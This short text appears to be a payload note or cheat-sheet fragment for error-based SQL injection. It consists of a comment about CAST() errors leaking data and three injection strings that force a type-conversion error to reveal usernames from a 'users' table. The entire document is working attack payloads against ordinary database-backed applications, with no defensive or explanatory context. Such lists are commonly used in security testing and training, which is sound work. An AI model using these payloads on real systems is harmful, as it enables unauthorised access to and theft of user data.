

-- CAST() on password string caused exception and shows data in error
' AND CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT username FROM users) AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--





